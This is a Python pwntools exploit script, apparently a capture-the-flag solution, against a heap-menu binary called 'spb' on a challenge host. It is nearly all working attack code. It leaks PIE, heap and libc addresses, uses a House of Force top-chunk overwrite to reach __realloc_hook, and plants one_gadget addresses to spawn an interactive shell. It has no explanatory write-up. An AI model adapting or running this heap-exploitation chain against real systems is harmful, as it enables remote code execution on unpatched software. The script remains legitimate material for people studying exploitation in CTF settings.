#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenge.rgbsec.xyz --port 6969 ./spb
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./spb')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenge.rgbsec.xyz'
port = int(args.PORT or 6969)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

def init(size, name):
    io.recvuntil('> ')
    io.sendline(str(size))
    io.recvuntil('> ')
    io.sendline(name)

def getleak():
    io.recvuntil('> ')
    io.sendline('3')

def choose(size, data):
    io.recvuntil('> ')
    io.sendline('1')
    io.recvuntil('> ')
    io.sendline(str(size))
    io.recvuntil('> ')
    io.sendline(data)

def getdrink(member, fuck):
    io.recvuntil('> ')
    io.sendline('2')
    io.recvuntil('> ')
    io.sendline(str(member))
    io.recvuntil('> ')
    io.sendline(str(fuck))

def return_size(target, wilderness):
    return target - wilderness - 0x10

init(0, 'H'*0x17)
io.sendline()
getleak()
io.recvuntil('You sang ')
pie = int(io.recvn(14), 0) - 0xf08
log.info('Pie leak {}'.format(hex(pie)))
choose(0x18, 'K'*0x17)
io.sendline()
getleak()
io.recvuntil('You sang ')
heap = int(io.recvn(14), 0)
log.info('Heap leak {}'.format(hex(heap)))
target_address = pie + 0x202040
choose(return_size(target_address, heap + 0x10), 'A')
choose(0x110, p64(pie + 0x202050) + p64(0x7f7f7f7f7f7f7f7f))
getdrink(8, 0)
choose(0x210000, 'AAAA')
getleak()
io.recvuntil('You sang ')
libc.address = int(io.recvn(14), 0) + 0x210ff0
log.info('Libc leak {}'.format(hex(libc.address)))
getdrink(8, -1)
target2 = libc.sym.__realloc_hook - 0x8
choose(return_size(target2, pie + 0x202168), 'BBBBBBBB')
def attack(size, data):
    io.recvuntil('> ')
    io.sendline('1')
    io.recvuntil('> ')
    io.sendline(str(size))
choose(0x110, p64(libc.address + 0x4f3c2) + p64(libc.address + 0x10a45c ) + p64(libc.sym.realloc + 8) + 'AAAAAAA')
#pause()
attack(0x100, 'A')
io.interactive()